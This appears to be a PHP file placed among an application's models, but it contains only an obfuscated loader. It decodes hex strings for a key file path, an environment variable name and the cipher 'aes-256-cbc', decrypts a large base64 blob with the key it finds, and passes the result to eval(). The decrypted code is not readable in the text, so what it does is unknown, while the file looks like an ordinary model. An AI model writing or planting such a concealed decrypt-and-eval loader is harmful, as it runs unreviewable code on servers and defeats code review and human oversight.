<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Kz5Ksln4y0QlwUsSI9nZGw==');

$c=base64_decode(

'XJMsnYQ7Twt90db2us7rjFYLzTxQDiib706pzs5n1Uup7VbfZwy85pbvwa5tH/YwcL7sT2dEiLfj' .
'5Rwj1ZpizkemFM8AahX4+IcykRTndO0IMjYMdBLGsmlGVenpmiMNFZ5DP5AEJc02CCAtqn6rW0Fx' .
'jSUNB0O18+/6xLKXrl4H5Hm9kmWKquAI+IOedMZQVHkWCHamDTgkVFHu5EAQci7P1bkLAt1NZLHi' .
'1TyAuSv6GaGl9WbdC01CrKLtu3L9fZIN0PzCvCpoRQqtYeUzz8+WsYmUqbS1bR0n5LXLEzB5EViP' .
'+V8Xo2xMv9wnXCY5Gexj9AMYyWru2SNuyGu0FY7B84K7AL5G4uEVyUEEnYVKNILF0wIfOolRNYpB' .
'wY7SacAN2C4ZA7mp43+pbaeacUOfj9f6FLInKBUcxyTi2zRT5vlWcf10AJjE8FTvaH23y95bSHYc' .
'JCkHMrsjm+br+cV66xE+Xg0hLv5c470Zmc+IwYQvng00AnmMyYR+JOe3BEO0/pPMO/1F68M7N6ma' .
'uNGJQhdoMTERRCfE9FUbntCyHv8Q3JZdInJioR9M23sZTDwJ5bPRmCXzgB78tjWyGGKPxB07VPOI' .
'02Ri4Y4bgGr4FIRwyUfZI41a53AOO3VsTRm6ebEtWuOIj7yxLfatELMEVp9P++Jz/7A0xE6T+R5a' .
'G3euKMYqIMcr6wn88PMNYE6dko7wo0lcS130/cnXV+dCVoFnA+TaVW2/XJnP+arFb2HdmAFSQ09O' .
'CyyIy6gIMewNBpnUY2F3VyYyx45f1dnD4Yd3VD8nYuQzV6M5tlPCpaEc7cSf/Oj2tdlZ90+dNeAL' .
'MOpGTa/vtzkkavtqUt81FryMgH56KO3uPUnMU60ABmceNrQAx8MFHVTFa3ys7R/afyyeOZMq9ZHr' .
'TQDn4PQTM16FOzIjNhQ/43aC9SNm689re8PZiyh1GWGoG/izhJ1KmoYzkVuPSs+z/ZEeLbsf7z6k' .
'6pKhnqsCsfGgU2hBXneuVJJOx3l/r1dHq8xn5rBh6Vie8vr5M6+OfTdFd3ys4NKwmrGOMb6s+uj9' .
'wd4OMcqSckO4jcYz5JdrfCcpMNn9vg9UyFHgRUlqsgvPZ2vmZyVqfNERjBeplGCmEvwDUrwlZoth' .
'6VjgukTTlFzeez5dBBHqmygXZRnzkBI3WuwEYvCSYORu88aSaHPOmvdyBBEHm2DkpHoWAERJ1wl4' .
'7mpKbwUyfDdr5n7GZFWhTckqtP/JMPckChIyt93N/BUi5WDYPnRZuQNoafHj5WR/Lbbx+hdz7dv3' .
'5vZBVs+w78Q5b31xEw4V203iGnaUFMuFH5oWa1Li7/8xLiR8WvUv5WtNx9OYXZvYDC9iYGFkbI9u' .
'49pREM7tFpkN7Vq5YrTeIggOMoE8/K9ZKJFizByDfjwNnTdRbZHaOYlvmP/JcIexQBfx8Ac2P6NJ' .
'onQh+bsIb/oP12REKU8UiW1etHNmMeL+bK/JSTYnvNb2eHnqjzL5a/yG/UEl+HFwAqpRIfDZmAn7' .
'zvfotrE0WJLy84tm2nXqFWQ/bRVlMuUn+gGxQS3uucYjhxW4uLd333jxNp96tu1EuET75/ctS7QT' .
'JswEfqkVb/vKaXpBJgBRc3TkBLUf7b6LOVP/d0M3WLmKOlX/3ZrZKdA1oeZaRqrRYYQ1G/+GPV9q' .
'/3rdG9yUZJSSwvPtC9c5WTn5Q1uENsdvicO8OgpJwot+aSKvZwXgRoeYnQHiufYWDBXnEQk1/IpM' .
'Ih2RdO+7GkL0HReX/yn6g7jlov9ft0iDR1hqkVm7eL9C7C3dqMmiHtrhDwEN9WefDfK4YjqzzRM+' .
'd3ISXvQBFe6/dK/qJS5VO7+u0uHTGybBHZo51GUrIU4SrfHiJwkfCGkPX7AQscLfP5hSsb6m4eYq' .
'jneNtW96JSqaKiNQ6xtKX8UKJVyzWLHAb4GvuPhyDa2/dGPqvF7IOtHopniN7mcB32rxTXSkQfSv' .
'Yiz19ttH+yI7YCs0/rJy8I98btsgig=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

